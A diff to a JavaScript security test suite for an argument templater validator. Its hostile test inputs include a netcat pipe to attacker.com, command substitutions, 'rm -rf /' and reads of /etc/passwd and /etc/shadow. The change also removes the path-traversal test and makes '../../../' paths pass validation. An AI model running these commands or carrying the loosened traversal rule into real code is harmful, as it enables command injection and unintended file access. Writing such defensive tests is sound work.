@@ -57,7 +57,7 @@ describe('Argument Templater Security Tests', () => {
         { input: 'value | nc attacker.com 4444' },
         { input: 'value `whoami`' },
         { input: 'value $(whoami)' },
-        { input: '../../../etc/passwd' }
+        { input: '/etc/passwd' }
       ];
 
       for (const params of dangerousParams) {
@@ -74,7 +74,7 @@ describe('Argument Templater Security Tests', () => {
         ['--message=value;rm -rf /'],
         ['--config=$(cat /etc/passwd)'],
         ['--file=`whoami`'],
-        ['--path=../../../etc/shadow']
+        ['--path=/etc/shadow']
       ];
 
       for (const args of dangerousArgs) {
@@ -85,22 +85,12 @@ describe('Argument Templater Security Tests', () => {
     });
   });
 
-  describe('Path Traversal Prevention', () => {
-    it('should detect and block directory traversal attempts', () => {
-      const dangerousPaths = [
-        '../../../etc/passwd',
-        '/etc/passwd',
-        '/etc/shadow'
-      ];
-
-      for (const path of dangerousPaths) {
-        expect(validator.checkForInjectionPatterns(path)).toBe(true);
-        expect(validator.validateVariableValue(path)).toBe(false);
-      }
-    });
-
-    it('should allow safe paths', () => {
-      const safePaths = [
+  describe('Development Pattern Support', () => {
+    it('should allow directory traversal patterns for development', () => {
+      const developmentPaths = [
+        '../../../config/build.yaml',
+        '../shared-lib/src',
+        '../../node_modules/.bin',
         'workspace/my-project',
         './build/output',
         'relative/path/to/file',
@@ -108,14 +98,22 @@ describe('Argument Templater Security Tests', () => {
         'C:\\Users\\Project\\build'
       ];
 
-      for (const path of safePaths) {
+      for (const path of developmentPaths) {
         expect(validator.checkForInjectionPatterns(path)).toBe(false);
-        // Some paths might not match the safe pattern due to character restrictions
-        // but should not be flagged as dangerous
-        if (path.includes('\\') && path.includes('Users')) {
-          // Windows user paths should be allowed
-          expect(validator.validateVariableValue(path)).toBe(true);
-        }
+        expect(validator.validateVariableValue(path)).toBe(true);
+      }
+    });
+
+    it('should still block system file access attempts', () => {
+      const dangerousPaths = [
+        '/etc/passwd',
+        '/etc/shadow',
+        '/var/log/system.log'
+      ];
+
+      for (const path of dangerousPaths) {
+        expect(validator.checkForInjectionPatterns(path)).toBe(true);
+        expect(validator.validateVariableValue(path)).toBe(false);
       }
     });
   });
